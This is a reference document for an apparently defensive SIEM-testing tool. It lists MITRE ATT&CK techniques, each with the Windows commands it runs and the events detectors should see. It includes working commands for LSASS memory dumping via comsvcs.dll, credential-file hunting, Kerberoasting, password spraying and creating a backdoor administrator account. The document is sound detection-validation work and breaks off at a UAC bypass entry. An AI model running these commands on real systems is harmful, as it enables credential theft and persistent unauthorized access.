## Techniques — Complete Reference

> **NIST 800-53:** Each technique contains associated NIST 800-53 controls in the YAML playbook (e.g., `AC-3, AU-12, SI-4`). These are displayed in the web UI in the "Playbooks" tab in the **NIST** column, enabling mapping of simulation results to compliance requirements.

### Phase 1: Discovery (Enumeration)

Discovery techniques run in Phase 1 and generate exclusively read-only accesses. They serve to disrupt recon behavior for UEBA baselines and test enumeration detections.

---

#### T1082 — System Information Discovery

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1082](https://attack.mitre.org/techniques/T1082/) |
| Tactic | Discovery |
| Exabeam Rules | 10 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Burst of system recon commands in rapid succession — Exabeam UEBA signal
systeminfo                        # OS, Domain, RAM, Patches (EID 4688 for systeminfo.exe)
wmic computersystem get Domain,Manufacturer,Model,UserName  # WMI recon (wmic.exe)
wmic bios get SerialNumber,Manufacturer,SMBIOSBIOSVersion   # Hardware fingerprint
wmic os get Caption,Version,BuildNumber,OSArchitecture      # OS details
reg query "HKLM\SOFTWARE\Microsoft\Cryptography" /v MachineGuid  # Machine identification
hostname; whoami; whoami /priv    # User context + privileges
net config workstation            # Domain, DC, computer name
ipconfig /all                     # Network configuration
```

**Why attackers do this:** System information is the first step after a compromise. The WMIC queries with `ComputerSystem`, `BIOS` and `OS` are particularly characteristic — Exabeam evaluates the burst of multiple Discovery tools in a short time as a UEBA anomaly. `MachineGuid` from the registry is used for system fingerprinting. `whoami /priv` shows existing privileges for privilege escalation planning.

**Expected SIEM Events:**
- `4688` — `systeminfo.exe`, `wmic.exe`, `hostname.exe`, `whoami.exe`, `net.exe` (burst of multiple 4688 events)
- `Sysmon 1` — Process creation with full command line and hash for each command
- `4104` — ScriptBlock: WMIC and registry queries

---

#### T1087 — Account Discovery

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1087.001](https://attack.mitre.org/techniques/T1087/001/) |
| Tactic | Discovery |
| Exabeam Rules | 25 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
net user                           # All local user accounts (EID 4688)
net user /domain 2>&1              # Domain users (EID 4688)
net localgroup administrators      # Admin group members
whoami /all                        # Current user + privileges + SID
cmdkey /list                       # Stored credentials (lateral movement preparation)
query user 2>&1                    # Active terminal sessions
wmic useraccount get Name,SID,Disabled,PasswordExpires  # WMI account enumeration
dir C:\Users 2>&1                  # All user profiles (shows accounts without net.exe)
```

**Why attackers do this:** Account Discovery is a prerequisite for privilege escalation and lateral movement. `cmdkey /list` shows stored credentials for RDP and other services — a direct treasure trove for attackers. `query user` shows active sessions (who is currently logged in). `dir C:\Users` lists accounts without a Windows command. The combination of multiple methods generates a burst pattern in the SIEM.

**Expected SIEM Events:**
- `4688` — `net.exe`, `whoami.exe`, `cmdkey.exe`, `wmic.exe`, `query.exe` (burst of multiple events)
- `Sysmon 1` — Process chain with command-line arguments
- `4104` — ScriptBlock: WMIC account query

---

#### T1049 — System Network Connections Discovery

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1049](https://attack.mitre.org/techniques/T1049/) |
| Tactic | Discovery |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
netstat -ano                   # All connections with PID (EID 4688)
netstat -anob                  # +Process name (shows which process holds which connection)
Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -notmatch "127\.0\.0\.1|::1|0\.0\.0\.0" }
                               # External connections — C2 server identification
net use                        # Active network drives (lateral movement artifacts)
net session 2>&1               # Incoming SMB sessions (user accessing this host)
wmic path win32_networkconnection get LocalName,RemoteName,Status  # WMI network connections
```

**Why attackers do this:** Active network connections show the attacker which servers the system knows (database servers, domain controllers, share servers) — potential lateral movement targets.

**Expected SIEM Events:**
- `4688` — `netstat.exe` process creation
- `Sysmon 1` — `netstat.exe` with `-ano`

---

#### T1016 — System Network Configuration Discovery

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1016](https://attack.mitre.org/techniques/T1016/) |
| Tactic | Discovery |
| Exabeam Rules | 5 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
ipconfig /all           # All network adapters with details (IP, MAC, gateway, DNS)
route print             # Routing table (shows subnet structure)
ipconfig /displaydns    # Local DNS cache (shows known hostnames)
```

**Why attackers do this:** The network configuration reveals the subnet topology, gateway addresses for further pivoting, and the DNS cache shows recently contacted systems — valuable recon information for attack planning.

**Expected SIEM Events:**
- `4688` — `ipconfig.exe` with `/all` and `/displaydns`
- `Sysmon 1` — Process creation with arguments

---

#### T1057 — Process Discovery

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1057](https://attack.mitre.org/techniques/T1057/) |
| Tactic | Discovery |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# tasklist variants — /v (user context) and /svc (services) are most suspicious
tasklist                      # All processes (EID 4688)
tasklist /v 2>&1              # Verbose with user context
tasklist /svc 2>&1            # Services per process
tasklist | findstr /i "lsass csrss winlogon svchost defender mssense splunk cb"  # Targeted search

# wmic process get CommandLine — highest signal (EID 4688 wmic.exe, CommandLine field)
wmic process get Name,ProcessId,ParentProcessId,CommandLine /format:csv

# PowerShell Win32_Process with CommandLine (EID 4104)
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, ParentProcessId, CommandLine | Where-Object { $_.CommandLine -ne $null }

# Parent-Child tree reconstruction — attacker maps process chain
Get-WmiObject Win32_Process | ForEach-Object {
    $parent = (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.ParentProcessId)").Name
    [PSCustomObject]@{ Name=$_.Name; PID=$_.ProcessId; Parent=$parent }
} | Where-Object { $_.Name -match "lsass|csrss|winlogon|services|svchost" }
```

**Why attackers do this:** Attackers enumerate processes to identify security tools (Sysmon, Splunk, CrowdStrike) that they need to disable. `wmic process get CommandLine` is particularly valuable because it shows the full command line of all running processes — a direct detection signal for this argument. The parent-child reconstruction helps attackers identify injection targets.

**Expected SIEM Events:**
- `4688` — `tasklist.exe` with `/v` and `/svc`, `wmic.exe` with `process get commandline`
- `Sysmon 1` — Process creation with full command line
- `4104` — ScriptBlock: `Win32_Process CommandLine` query

---

#### T1083 — File and Directory Discovery

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1083](https://attack.mitre.org/techniques/T1083/) |
| Tactic | Discovery |
| Exabeam Rules | 38 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# dir /s /b — attacker-typical directory listing (EID 4688 for cmd.exe)
cmd /c "dir /s /b `"$env:USERPROFILE`" 2>nul"
cmd /c "dir /s /b `"C:\Users`" 2>nul"

# tree /F — directory structure mapping (EID 4688 for tree.com)
tree "$env:USERPROFILE" /F 2>&1

# Sensitive file search — credential hunting pattern
Get-ChildItem -Path $env:USERPROFILE -Recurse -ErrorAction Ignore `
    -Include "*.pdf","*.docx","*.xlsx","*.kdb","*.kdbx","*.pem","*.pfx","*.p12" |
    Select-Object FullName, Length, LastWriteTime

# Recently modified files — attacker checks recent activity
Get-ChildItem -Path $env:USERPROFILE -Recurse -ErrorAction Ignore |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
    Sort-Object LastWriteTime -Descending | Select-Object -First 10

# Alternate Data Stream (ADS) detection — hidden data
Get-ChildItem -Path $env:TEMP -ErrorAction Ignore | ForEach-Object {
    $streams = Get-Item $_.FullName -Stream * | Where-Object { $_.Stream -ne ':$DATA' }
    if ($streams) { Write-Host "ADS found: $($_.FullName)" }
}

# Credential file search via findstr
cmd /c "dir /s /b `"$env:USERPROFILE`"" | Where-Object { $_ -match "pass|cred|secret|key|token|\.config$|\.env$" }
```

**Why attackers do this:** Attackers search for KeePass databases (`.kdbx`), certificates (`.pem/.pfx`), recently edited files, and credential files. `dir /s /b` and `tree /F` are characteristic attacker commands (no normal users use these). ADS detection shows whether hidden data is present.

**Expected SIEM Events:**
- `4688` — `cmd.exe` with `dir /s /b`, `tree.com` process
- `Sysmon 1` — `tree.com` and `cmd.exe` process creation
- `4104` — ScriptBlock: `Get-ChildItem` with sensitive include filters and ADS detection

---

#### T1069 — Permission Groups Discovery

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1069.001](https://attack.mitre.org/techniques/T1069/001/) |
| Tactic | Discovery |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# net localgroup Administrators — highest signal in SIEM rule sets (standalone Tier-1 alert)
net localgroup                          # All groups
net localgroup Administrators           # Admin members (standalone Tier-1 SIEM alert)
net localgroup "Remote Desktop Users"   # RDP permission
net localgroup "Remote Management Users" # WinRM permission
net localgroup "Backup Operators"       # Backup privilege (can dump SAM)

# whoami /groups — current group membership
whoami /groups /fo csv

# PowerShell Get-LocalGroup / Get-LocalGroupMember (EID 4104)
Get-LocalGroup | Select-Object Name, Description, SID
Get-LocalGroupMember -Group "Administrators"

# wmic group enumeration (EID 4688 for wmic.exe)
wmic group get Name,SID,Domain,LocalAccount /format:csv

# .NET WindowsIdentity — attacker checks own privileges
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object {
    try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch { $_.Value }
} | Where-Object { $_ -match "Admin|Power|Remote|Backup" }

# Domain groups (if domain-joined)
net group /domain 2>&1
net group "Domain Admins" /domain 2>&1
```

**Why attackers do this:** `net localgroup Administrators` is one of the most heavily signed commands in SIEM rule sets — many solutions treat it as a standalone Tier-1 alert. "Remote Management Users" shows WinRM access paths for PowerShell remoting. "Backup Operators" have the right to read the SAM database — an escalation path.

**Expected SIEM Events:**
- `4688` — `net.exe` with `localgroup Administrators` — **standalone Tier-1 SIEM alert**
- `4688` — `whoami.exe` with `/groups`, `wmic.exe`
- `4104` — ScriptBlock: `Get-LocalGroup`, `.NET WindowsIdentity` queries

---

#### T1046 — Network Service Discovery (Port Scan)

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1046](https://attack.mitre.org/techniques/T1046/) |
| Tactic | Discovery |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Parallel port scan via RunspaceFactory — generates burst signature (like real scanners)
# 10 runspaces simultaneously — sequential scans don't create a recognizable scanner pattern
$ports = @(21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 1433, 3306, 3389, 5985, 5986, 8080, 8443, 9389)
$pool = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspacePool(1, 10)
$pool.Open()
$jobs = foreach ($port in $ports) {
    $ps = [PowerShell]::Create()
    $ps.RunspacePool = $pool
    $ps.AddScript({
        param($target, $port)
        $tcp = New-Object System.Net.Sockets.TcpClient
        try { $tcp.Connect($target, $port); $tcp.Close(); "OPEN:$port" } catch { "CLOSED:$port" }
    }).AddArgument("127.0.0.1").AddArgument($port) | Out-Null
    @{ PS=$ps; Handle=$ps.BeginInvoke() }
}
$jobs | ForEach-Object { $_.PS.EndInvoke($_.Handle); $_.PS.Dispose() }
$pool.Close()
```

**Why attackers do this:** Port scanning serves service identification for lateral movement. The key difference: Sequential scans don't create a recognizable pattern in SIEM rule sets. **Parallel** connection attempts generate a burst of Sysmon EID 3 events in a very short time — exactly the pattern that Nmap and other scanners generate and that SIEM correlation rules check for.

**Expected SIEM Events:**
- `Sysmon 3` — NetworkConnect burst: 18 events in ~1-2 seconds (burst signature = scanner pattern)
- `4688` — `powershell.exe` process creation
- `4104` — ScriptBlock: RunspaceFactory parallel scan

---

#### T1135 — Network Share Discovery

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1135](https://attack.mitre.org/techniques/T1135/) |
| Tactic | Discovery |
| Exabeam Rules | 12 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
net share                                   # Local shares
net view \\$env:COMPUTERNAME                # Shares on local host
Get-SmbShare                                # PowerShell SMB enumeration

# Access admin shares (generates Event 5140)
foreach ($share in @("C$", "IPC$", "ADMIN$")) {
    Test-Path "\\$env:COMPUTERNAME\$share"
}
```

**Why attackers do this:** Network shares are primary exfiltration targets. Admin shares (`C$`, `ADMIN$`) enable remote code execution. Event 5140 (Network Share Object Access) is an important Exabeam signal for unusual share access.

**Expected SIEM Events:**
- `4688` — `net.exe` with `view` and `share`
- `5140` — Network share object accessed
- `Sysmon 3` — SMB connections (Port 445)

---

#### T1482 — Domain Trust Discovery

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1482](https://attack.mitre.org/techniques/T1482/) |
| Tactic | Discovery |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# nltest — most common attacker tool for trust enumeration
nltest /domain_trusts           # All trust relationships
nltest /dclist:$env:USERDOMAIN  # List domain controllers

# PowerShell .NET trust enumeration
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domain.GetAllTrustRelationships()
```

**Why attackers do this:** Domain trusts are the bridges for forest-spanning lateral movement. An attacker who knows a domain trust relationship can move into trusted domains. `nltest.exe` with `/domain_trusts` is such a characteristic attacker pattern that many EDR solutions directly classify this call as an Indicator of Compromise.

**Expected SIEM Events:**
- `4688` — `nltest.exe` with `/domain_trusts`
- `Sysmon 1` — `nltest.exe` process creation

---

### Phase 2: Attack

Attack techniques simulate the actual attack and post-exploitation actions. Many of these techniques require administrator rights and create artifacts that are removed during cleanup.

---

#### T1059.001 — PowerShell Execution

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) |
| Tactic | Execution |
| Exabeam Rules | **79** |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# 1. Encoded Command — typical attacker obfuscation pattern
$command = "Write-Host 'LogNoJutsu: Simulated payload'; Get-Date; whoami"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
powershell.exe -NonInteractive -EncodedCommand $encoded

# 2. Invoke-Expression — simulated download cradle (IEX) pattern
$simulatedPayload = { Get-Process | Select-Object -First 5 }
Invoke-Expression ($simulatedPayload.ToString())
```

**Why attackers do this:** PowerShell is the most important attacker tool on Windows systems. The `-EncodedCommand` flag is the standard pattern for obfuscation. `Invoke-Expression` (IEX) combined with download cradles is the pattern for fileless malware. With 79 dedicated Exabeam rules, T1059.001 is one of the most important techniques to test.

**Expected SIEM Events:**
- `4688` — `powershell.exe` with `-EncodedCommand` in the command line
- `4104` — ScriptBlock logging of the decoded command
- `4103` — Module logging
- `Sysmon 1` — Process creation with Base64 payload in argument

---

#### T1059.003 — Windows Command Shell

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) |
| Tactic | Execution |
| Exabeam Rules | 34 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```cmd
cmd.exe /C "whoami /all"
cmd.exe /C "net user"
cmd.exe /C "net localgroup administrators"
cmd.exe /C "systeminfo | findstr /B /C:`"OS Name`" /C:`"Domain`""
cmd.exe /C "dir C:\Users /AD"
```

**Why attackers do this:** `cmd.exe` is present on every Windows system and is used by attackers for quick system recon and as a shell after exploitation. The characteristic commands (`whoami`, `net user`, `systeminfo`) are strong SIEM signals, as normal users rarely execute these.

**Expected SIEM Events:**
- `4688` — `cmd.exe` with `/C` and suspicious arguments (multiple times)
- `Sysmon 1` — Process creation with full command line

---

#### T1027 — Obfuscated Files or Information

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1027](https://attack.mitre.org/techniques/T1027/) |
| Tactic | Defense Evasion |
| Exabeam Rules | 47 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# 1. Base64-encoded Command (most common pattern in practice)
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
powershell.exe -EncodedCommand $encoded

# 2. String-Concatenation Obfuscation (bypasses simple signatures)
$a = "Get-"; $b = "Pro"; $c = "cess"
Invoke-Expression ($a + $b + $c)

# 3. Tick-Mark Obfuscation (PowerShell escape character as obfuscation)
G`et-`Hos`tN`ame

# 4. Double-Encoded Command (triggers Exabeam anomaly for nested encoding)
powershell.exe -EncodedCommand <base64(powershell.exe -EncodedCommand <base64>)>
```

**Why attackers do this:** Obfuscation is the primary mechanism for bypassing signature-based detections. Exabeam has 47 dedicated rules for this technique because it is universal attacker behavior. Double-encoding in particular is a strong signal, as no legitimate script would do this.

**Expected SIEM Events:**
- `4104` — ScriptBlock logging shows obfuscated code
- `4688` — `powershell.exe` with `-EncodedCommand` or `-Enc` flag
- `Sysmon 1` — Process argument contains Base64 string

---

#### T1218.011 — Rundll32 Proxy Execution

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1218.011](https://attack.mitre.org/techniques/T1218/011/) |
| Tactic | Defense Evasion |
| Exabeam Rules | 27 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Rundll32 shell32.dll — generates Sysmon Event 1 and 7 (DLL loaded)
Start-Process "rundll32.exe" -ArgumentList "shell32.dll,Control_RunDLL"

# Rundll32 advpack.dll — commonly used in malware for INF execution
Start-Process "rundll32.exe" -ArgumentList "advpack.dll,DelNodeRunDLL32 test.inf"

# Rundll32 url.dll — phishing-typical pattern
Start-Process "rundll32.exe" -ArgumentList "url.dll,FileProtocolHandler"
```

**Why attackers do this:** `rundll32.exe` is a signed Windows binary (LOLBin) that can execute arbitrary DLL functions. Attackers use it to bypass application whitelisting, since `rundll32.exe` itself is considered trusted. The Exabeam rule set for T1218 (116 rules total) is one of the most comprehensive.

**Expected SIEM Events:**
- `4688` — `rundll32.exe` with unusual arguments
- `Sysmon 1` — Process creation with DLL argument
- `Sysmon 7` — ImageLoaded — DLL loaded by Rundll32

---

#### T1047 — WMI Execution

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1047](https://attack.mitre.org/techniques/T1047/) |
| Tactic | Execution |
| Exabeam Rules | 18 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# WMIC process enumeration
wmic process list brief

# WMIC local process creation (child process of WmiPrvSE.exe)
wmic process call create "cmd.exe /C whoami"

# PowerShell Invoke-WmiMethod (generates Sysmon Event 20)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /C hostname"

# WMI system information (recon via WMI interface)
Get-WmiObject -Class Win32_OperatingSystem
Get-WmiObject -Class Win32_ComputerSystem
```

**Why attackers do this:** WMI is a native Windows mechanism that can start processes without a direct `CreateProcess()` call. Processes started via WMI have `WmiPrvSE.exe` as the parent process instead of `cmd.exe` or `powershell.exe` — a classic defense evasion technique. WMI-based execution is difficult to detect without Sysmon Event 20.

**Expected SIEM Events:**
- `4688` — `wmic.exe` process creation
- `Sysmon 1` — Child processes with `WmiPrvSE.exe` as parent
- `Sysmon 20` — WMI Activity Events

---

#### T1110.001 — Password Brute Force

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) |
| Tactic | Credential Access |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# 10 failed NTLM authentication attempts
# Target accounts do NOT exist — no real accounts are locked out
for ($i = 1; $i -le 10; $i++) {
    $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(...)
    $ctx.ValidateCredentials("lognojutsu_nonexistent_$i", "WrongPassword$i!")
    Start-Sleep -Milliseconds 200
}
```

**Why attackers do this:** Brute-force attacks on passwords are the most classic credential access vector. The simulation generates 10 Event 4625 entries in rapid succession — the basic detection pattern for brute force in almost every SIEM.

**Expected SIEM Events:**
- `4625` × 10 — "Account failed to log on" in rapid succession
- `4740` — Account Lockout (if lockout policy applies)

---

#### T1110.003 — Password Spraying

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1110.003](https://attack.mitre.org/techniques/T1110/003/) |
| Tactic | Credential Access |
| Exabeam Rules | **1** (Gap validation!) |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Enumerate all enabled local accounts
$accounts = Get-LocalUser | Where-Object { $_.Enabled }

# A single password against all accounts — prevents lockout
foreach ($account in $accounts | Select-Object -First 5) {
    $ctx.ValidateCredentials($account.Name, "Password1_SPRAY_SIM_INVALID")
    Start-Sleep -Milliseconds 500  # Slow rate = low-and-slow pattern
}
```

**Why attackers do this:** Password spraying bypasses account lockout policies by only trying one password per account. This is one of the most common initial access techniques in real incidents (Microsoft, Okta, SolarWinds all affected). **With only 1 Exabeam rule, this is one of the most important gap validations.**

**Expected SIEM Events:**
- `4625` — Failed logons distributed across multiple accounts
- `4771` — Kerberos pre-auth failed (on domain systems)

---

#### T1003.001 — LSASS Memory Access

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1003.001](https://attack.mitre.org/techniques/T1003/001/) |
| Tactic | Credential Access |
| Exabeam Rules | 18 |
| Admin Required | **Yes** |
| Cleanup | None |

**What is executed:**

```powershell
# Method 1: comsvcs.dll MiniDump via rundll32 — LOLBin approach (Sysmon EID 1+10+11)
# Generates exactly the events that ProcDump and Cobalt Strike generate
$lsassPID = (Get-Process lsass).Id
$dumpPath = "$env:TEMP\lsass_sim.dmp"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID $dumpPath full

# Method 2: Windows API OpenProcess with GrantedAccess=0x1010
# 0x1010 = PROCESS_VM_READ (0x0010) | PROCESS_QUERY_INFORMATION (0x0400) — exact Mimikatz/SafetyKatz value
# This is the flag that Sysmon EID 10 and SIEM rules check for (0x0400 alone triggers far fewer rules)
$handle = [LNJ01.LNJWin]::OpenProcess(0x1010, $false, $lsassPID)
[LNJ01.LNJWin]::CloseHandle($handle)  # NO credential extraction

# Method 3: ProcDump-like access with 0x1fffff (PROCESS_ALL_ACCESS)
$handle2 = [LNJ01.LNJWin]::OpenProcess(0x1fffff, $false, $lsassPID)
[LNJ01.LNJWin]::CloseHandle($handle2)
```

**Why attackers do this:** LSASS (Local Security Authority Subsystem Service) stores password hashes and Kerberos tickets in memory. Tools like Mimikatz, Procdump, and Task Manager can dump the LSASS process. The critical difference: `GrantedAccess=0x1010` is the exact access mask value of Mimikatz — SIEM rules check for this specific value in the Sysmon 10 event. The LOLBin method via `comsvcs.dll MiniDump` additionally generates Sysmon EID 11 (FileCreate) for the dump file.

**Expected SIEM Events:**
- `Sysmon 10` — ProcessAccess: `TargetImage = lsass.exe`, `GrantedAccess = 0x1010` — **primary credential dumping signal**
- `Sysmon 1` — `rundll32.exe` with `comsvcs.dll, MiniDump` argument (LOLBin detection)
- `Sysmon 11` — FileCreate: `.dmp` file in `%TEMP%` (dump file detection)
- `4688` — `rundll32.exe` process creation with comsvcs.dll

---

#### T1003.006 — DCSync Simulation

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1003.006](https://attack.mitre.org/techniques/T1003/006/) |
| Tactic | Credential Access |
| Exabeam Rules | 4 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Enumerate Domain Controller (attacker recon before DCSync)
nltest /dclist:$env:USERDOMAIN
nltest /dsgetdc:$env:USERDOMAIN

# Search accounts with DS-Replication rights (DCSync target identification)
$searcher = [ADSISearcher]"(&(objectClass=user)(userAccountControl:...:=512))"

# List Domain Admins / Enterprise Admins (DCSync-capable groups)
foreach ($group in @("Domain Admins", "Enterprise Admins")) {
    $groupObj = [ADSI]"LDAP://CN=$group,CN=Users,$domainDN"
}

# Check domain object ACL for replication rights
Get-Acl "AD:\$((Get-ADDomain).DistinguishedName)"
```

**Why attackers do this:** DCSync abuses the MS-DRSR protocol (Directory Replication Service Remote Protocol) to replicate password hashes directly from the domain controller — without executing code on the DC. The only visible signal is Event 4662 (Directory Service object access) with the Replication rights GUIDs. Mimikatz command: `lsadump::dcsync /domain:corp /user:Administrator`.

**Expected SIEM Events:**
- `4662` — Directory Service object access (Replication rights)
- `4688` — `nltest.exe` process creation
- `4769` — Kerberos TGS for DRSUAPI service

---

#### T1552.001 — Credentials in Files

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Tactic | Credential Access |
| Exabeam Rules | 2 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Searches known credential storage paths
$paths = @($env:USERPROFILE, $env:APPDATA, "C:\inetpub", "C:\xampp")
$patterns = @("password", "passwd", "secret", "apikey", "connectionstring")
$extensions = @("*.xml", "*.ini", "*.config", "*.txt", "*.ps1", "*.bat")

foreach ($path in $paths) {
    Get-ChildItem $path -Filter $ext -Recurse |
        Where-Object { (Get-Content $_.FullName) -match $pattern }
}

# findstr as cmd variant (generates 4688 for findstr.exe)
cmd.exe /C "findstr /si password $env:USERPROFILE\*.xml *.ini *.txt"
```

**Why attackers do this:** Configuration files, deployment scripts, and application configs frequently contain passwords in plaintext. Web server configurations (IIS, Apache), database connection strings, and PowerShell scripts are the most common locations. `findstr /si password` is a well-known attacker command.

**Expected SIEM Events:**
- `4104` — ScriptBlock logging: filesystem traversal with credential search patterns
- `4688` — `findstr.exe` with `password` argument

---

#### T1558.003 — Kerberoasting

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1558.003](https://attack.mitre.org/techniques/T1558/003/) |
| Tactic | Credential Access |
| Exabeam Rules | 22 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# 1. LDAP query: accounts with Service Principal Names (Kerberoasting targets)
$spnAccounts = ([ADSISearcher]"(&(objectCategory=user)(servicePrincipalName=*))").FindAll()

# 2. Request Kerberos service tickets for found SPNs (generates Event 4769)
Add-Type -AssemblyName System.IdentityModel
foreach ($spn in $discoveredSPNs) {
    $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken($spn)
    # Ticket is cached in memory — normally then cracked offline
}

# 3. Display cached Kerberos tickets
klist
```

**Why attackers do this:** Kerberoasting allows cracking password hashes of service accounts offline without requiring admin rights. The attacker requests service tickets for accounts with SPNs (normal Kerberos behavior), extracts the encrypted part, and cracks it offline with Hashcat. Event 4769 with RC4 encryption (etype 23) instead of AES is the detection signal.

**Expected SIEM Events:**
- `4769` — Kerberos Service Ticket Request — **primary Kerberoasting signal**
- `4768` — Kerberos TGT Request
- `4104` — ScriptBlock: SPN enumeration via LDAP

---

#### T1550.002 — Pass the Hash Pattern

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1550.002](https://attack.mitre.org/techniques/T1550/002/) |
| Tactic | Lateral Movement |
| Exabeam Rules | 23 |
| Admin Required | No |
| Cleanup | Yes — network connections |

**What is executed:**

```powershell
# NTLM-based network share access (generates Event 4776/4624 type 3)
net use \\$localHost\IPC$ /user:$env:USERNAME ""

# Lateral attempts to multiple hosts (PtH spray pattern)
foreach ($target in @($env:COMPUTERNAME, "127.0.0.1", "localhost")) {
    net use \\$target\IPC$
}

# Explicit credential use (generates Event 4648 — core PtH signal)
cmdkey /add:$env:COMPUTERNAME /user:"$domain\$username" /pass:"..."
```

**Why attackers do this:** Pass-the-Hash uses the NTLM hash of a password instead of the plaintext for authentication. The primary detection signal is Event 4648 (explicit credential use) combined with Event 4624 Type 3 (network logon) via NTLM. Exabeam has 23 dedicated rules for this pattern. The actual PtH attack requires Mimikatz (`sekurlsa::pth`).

**Expected SIEM Events:**
- `4648` — Logon with explicit credentials — **primary PtH signal**
- `4624` Type 3 — Network logon via NTLM
- `4776` — NTLM credential validation

---

#### T1136.001 — Create Local Account

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) |
| Tactic | Persistence |
| Exabeam Rules | 10 |
| Admin Required | **Yes** |
| Cleanup | **Yes** — Account is deleted |

**What is created:**

```
Username: lnj_test_acct
Password: LogNoJutsu!Temp2024
Comment:  LogNoJutsu SIEM validation test account
```

**What is executed:**

```cmd
net user lnj_test_acct LogNoJutsu!Temp2024 /add /comment:"LogNoJutsu test"
```

**Cleanup:**

```powershell
net user lnj_test_acct /delete
```

**Why attackers do this:** Creating a backdoor user account is one of the most persistent backdoors an attacker can leave behind. Event 4720 is the direct signal. Exabeam additionally checks whether the new account has unusual properties (e.g., no password expiration, unknown naming convention).

**Expected SIEM Events:**
- `4720` — User account created — **core event for Account Manipulation use case**
- `4722` — User account enabled
- `4688` — `net.exe` with `/add` argument

---

#### T1098 — Account Manipulation (Add to Administrators)

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1098](https://attack.mitre.org/techniques/T1098/) |
| Tactic | Persistence, Privilege Escalation |
| Exabeam Rules | **57** |
| Admin Required | **Yes** |
| Cleanup | **Yes** — Group membership and account removed |

**What is executed:**

```powershell
# Step 1: Create account (EID 4720)
net user LNJManipUser "P@ssw0rd123!" /add /comment:"Windows Service Account" /fullname:"Windows Update Agent"

# Step 2: Add to Administrators (EID 4732 — Exabeam Account Manipulation trigger)
net localgroup Administrators LNJManipUser /add

# Step 3: Modify account properties (EID 4738 — PasswordNeverExpires)
Set-LocalUser -Name "LNJManipUser" -PasswordNeverExpires $true -UserMayNotChangePassword $true

# Step 4: Change password via net user (EID 4723)
net user LNJManipUser "NewP@ssw0rd456!"

# Step 5: Disable + re-enable account (EID 4725 + 4722)
net user LNJManipUser /active:no
net user LNJManipUser /active:yes
```

**Cleanup:**

```powershell
net localgroup Administrators LNJManipUser /delete
net user LNJManipUser /delete
```

**Why attackers do this:** The complete account manipulation chain (creation + escalation + attribute change + password) is the authentic APT backdoor sequence. Exabeam has 57 rules for T1098 because each step generates its own event. `PasswordNeverExpires=True` (EID 4738) is a strong signal that an account is being prepared for long-term persistence.

**Expected SIEM Events:**
- `4720` — User account created
- `4732` — Member added to Administrators — **primary Account Manipulation signal**
- `4738` — User account changed (PasswordNeverExpires, UserMayNotChangePassword)
- `4723` — Password change attempted
- `4725` — Account disabled + `4722` — Account re-enabled
- `4688` — `net.exe` with user management arguments

---

#### T1548.002 — UAC Bypass via Event Viewer

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1548.002](https://attack.mitre.org/techniques/T1548/002/) |
